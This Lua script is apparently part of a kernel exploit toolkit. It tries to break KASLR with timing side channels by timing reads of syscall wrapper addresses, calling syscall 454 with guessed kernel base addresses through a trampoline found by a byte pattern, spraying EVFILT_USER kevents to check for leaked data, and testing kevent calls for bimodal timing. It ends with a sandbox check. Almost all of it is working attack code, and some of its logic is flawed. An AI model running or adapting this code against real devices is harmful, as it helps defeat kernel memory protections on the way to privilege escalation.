--[[
    timing_kaslr_selfcontained.lua
    Timing side-channel for KASLR - no external deps
]]

local mem = rawget(_G, "memory")
local nat = rawget(_G, "native")
local S = rawget(_G, "syscall")
local T = rawget(_G, "thread")

S.resolve({kqueue = 362, kevent = 363, pipe = 42, close = 6, write = 4, read = 3, getpid = 20})

local function tonn(v)
    if v == nil then return 0 end
    if type(v) == "table" and v.h then return v.h * 4294967296 + v.l end
    return tonumber(tostring(v or 0)) or 0
end

local function toaddr(v)
    if v == nil then return 0 end
    if type(v) == "table" and v.h then return v.h * 4294967296 + v.l end
    return tonumber(tostring(v))
end

-- Timing using a loop-based measurement
local function get_time()
    -- Use a simple calibration loop if no get_time_us
    if T and T.get_time_us then
        return tonn(T.get_time_us())
    end
    return 0
end

local function measure(fn, reps)
    reps = reps or 100
    local times = {}
    for i = 1, reps do
        local t1 = get_time()
        fn()
        local t2 = get_time()
        times[i] = t2 - t1
    end
    table.sort(times)
    return {
        min = times[1],
        med = times[math.floor(reps/2)],
        max = times[reps],
        all = times,
    }
end

-- Check timing precision
local function calibrate()
    local empty = {}
    for i = 1, 1000 do
        local t1 = get_time()
        local t2 = get_time()
        empty[i] = t2 - t1
    end
    table.sort(empty)
    return {
        min = empty[1],
        med = empty[500],
        max = empty[1000],
        granularity = empty[500],
    }
end

print("[+] Timing side-channel: KASLR\n")

-- Step 1: Calibrate timing
print("[*] Step 1: Timing calibration")
local cal = calibrate()
print(string.format("[+] get_time_us() granularity: %dus (med)", cal.granularity or -1))
if cal.granularity == 0 then
    print("[!] Timing precision too coarse - results may be unreliable")
    print("[!] Trying get_time() alternatives...")
end

-- Step 2: Measure wrapper access time vs offset
print("\n[*] Step 2: Syscall wrapper address timing\n")

local wrap_timings = {}
for sc = 0, 600, 10 do
    local w = S.syscall_wrapper[sc]
    if w then
        local addr = toaddr(w)
        if addr > 0 then
            local m = measure(function()
                local b = mem.read_byte(addr)
            end, 50)
            wrap_timings[sc] = {
                addr = addr,
                min = m.min,
                med = m.med,
                max = m.max,
            }
        end
    end
end

-- Print sorted by address
local sorted = {}
for sc, t in pairs(wrap_timings) do
    sorted[#sorted + 1] = {sc = sc, addr = t.addr, med = t.med}
end
table.sort(sorted, function(a, b) return a.addr < b.addr end)

print(string.format("%-8s %-18s %-8s %-8s", "sc", "address", "med(us)", "delta"))
print(string.rep("-", 50))
local prev_med = 0
for _, e in ipairs(sorted) do
    local delta = e.med - prev_med
    print(string.format("%-8d 0x%014x %-8d %-8d", e.sc, e.addr, e.med, delta))
    prev_med = e.med
end

-- Step 3: Timing analysis of sc454
print("\n[*] Step 3: sc454 timing analysis (returns 14)\n")

-- fcall helper
local function find_tramp(w)
    for i = 0, 35 do
        if mem.read_byte(w + i) == 0x49 and mem.read_byte(w + i + 1) == 0x89 and mem.read_byte(w + i + 2) == 0xCA then
            return i
        end
    end
    return 7
end

local function fcall(scno, ...)
    local w = toaddr(S.syscall_wrapper[scno])
    if w == 0 then return nil end
    local tramp = w + find_tramp(w)
    local args = {...}
    return tonn(nat.fcall_with_rax(tramp, scno, args[1] or 0, args[2] or 0, args[3] or 0, args[4] or 0, args[5] or 0, args[6] or 0))
end

if S.syscall_wrapper[454] then
    for _, addr in ipairs({0, -1, 0xFFFFFFFF80000000, 0xFFFFFFFF80100000, 0xFFFFFFFF81000000, 0xFFFFFFFF82000000, 0xFFFFFFFF83000000, 0xFFFFFFFF90000000}) do
        local m = measure(function()
            fcall(454, addr, 0, 0, 0, 0, 0)
        end, 200)
        print(string.format("  sc454(0x%x): min=%d med=%d max=%d", addr, m.min, m.med, m.max))
    end
end

-- Step 4: KASLR brute force via EVFILT_USER data field analysis
print("\n[*] Step 4: EVFILT_USER data field analysis (values: 289-291)\n")

local kq = tonn(S.kqueue())
for i = 1, 200 do
    local ev = mem.alloc(32)
    mem.write_qword(ev + 0, i)
    mem.write_word(ev + 8, 0xFFF9)  -- EVFILT_USER
    mem.write_word(ev + 10, 0x25)   -- EV_ADD|EV_ENABLE|EV_CLEAR
    mem.write_dword(ev + 12, 0x80000000)  -- NOTE_TRIGGER
    mem.write_qword(ev + 16, 0)
    mem.write_qword(ev + 24, 0)
    S.kevent(kq, ev, 1, nil, 0, 0)
end

local out = mem.alloc(6400)
local ne = tonn(S.kevent(kq, nil, 0, out, 200, 0))
if ne and ne > 0 then
    print(string.format("[+] Got %d events", ne))
    local data_vals = {}
    for i = 0, ne - 1 do
        local off = i * 32
        local ident = tonn(mem.read_qword(out + off))
        local data = tonn(mem.read_qword(out + off + 16))
        if data > 0 then
            data_vals[#data_vals + 1] = data
        end
        if i < 5 then
            print(string.format("  [%d] ident=%d data=%d", i, ident, data))
        end
    end
    -- Analyze data pattern
    if #data_vals > 1 then
        local min_d = data_vals[#data_vals]
        local max_d = data_vals[1]
        local range = max_d - min_d
        print(string.format("[+] data range: %d - %d (range=%d)", min_d, max_d, range))
        -- Check if values look like kernel memory offset
        local avg_d = 0
        for _, v in ipairs(data_vals) do avg_d = avg_d + v end
        avg_d = avg_d / #data_vals
        print(string.format("[+] Average data value: %.1f", avg_d))
    end
    
    -- Check how ident values match (should be sequential)
    local mismatch = false
    for i = 0, ne - 1 do
        local off = i * 32
        local ident = tonn(mem.read_qword(out + off))
        if ident ~= i + 1 then
            mismatch = true
            if not mismatch then
                print("[!] Ident order mismatch!")
            end
        end
    end
    if not mismatch then
        print("[+] Ident order correct (1..200)")
    end
end
S.kevent(kq, nil, 0, nil, 0, 0)

-- Step 5: kqueue kevent timing (bimodal detection)
print("\n[*] Step 5: kqueue callback timing\n")

local kq5 = tonn(S.kqueue())
local pbuf5 = mem.alloc(16)
tonn(S.pipe(pbuf5))
local rd5 = tonn(mem.read_dword(pbuf5))
local wr5 = tonn(mem.read_dword(pbuf5 + 4))
local ev5 = mem.alloc(32)
mem.write_qword(ev5 + 0, rd5)
mem.write_word(ev5 + 8, 0xFFFF)  -- EVFILT_READ
mem.write_word(ev5 + 10, 0x5)    -- EV_ADD|EV_ENABLE
S.kevent(kq5, ev5, 1, nil, 0, 0)

-- Write data to pipe
local msg = mem.alloc(64)
for j = 0, 63 do mem.write_byte(msg + j, 0x42) end
S.write(wr5, msg, 64)

-- Measure kevent timing
local kev_times = {}
for i = 1, 500 do
    local out5 = mem.alloc(32)
    local t1 = get_time()
    local r = tonn(S.kevent(kq5, nil, 0, out5, 1, 0))
    local t2 = get_time()
    kev_times[i] = t2 - t1
end

table.sort(kev_times)
local kmin = kev_times[1]
local kmed = kev_times[250]
local kmax = kev_times[500]
print(string.format("kevent 500 samples: min=%d med=%d max=%d", kmin, kmed, kmax))

-- Bimodal check
local fast = 0
local slow = 0
for _, t in ipairs(kev_times) do
    if t <= kmed * 1.1 then fast = fast + 1 else slow = slow + 1 end
end
print(string.format("fast: %d (%.1f%%), slow: %d (%.1f%%)", fast, fast/5, slow, slow/5))
if slow > 50 then
    print("[!] Potential bimodal timing detected!")
    print("[!] Could indicate cache-dependent kernel behavior")
end

S.close(rd5)
S.close(wr5)
S.kevent(kq5, nil, 0, nil, 0, 0)

local sb = rawget(_G, "is_in_sandbox")
if sb then
    print("\n[+] is_in_sandbox() = " .. tonn(sb()))
end

print("\n[+] Timing analysis complete")
